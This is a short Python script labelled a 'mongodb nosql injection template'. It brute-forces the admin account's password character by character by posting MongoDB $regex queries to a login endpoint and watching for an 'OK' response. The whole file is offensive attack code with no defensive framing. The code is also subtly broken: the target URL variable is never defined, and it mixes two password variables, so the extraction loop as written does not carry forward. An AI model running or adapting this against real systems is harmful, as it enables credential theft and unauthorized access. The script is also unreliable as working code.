#!/usr/bin/python3

#mongodb nosql injection template

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

uname="admin"
pword=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (uname, pword + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("%s" % (password+c))
                password += c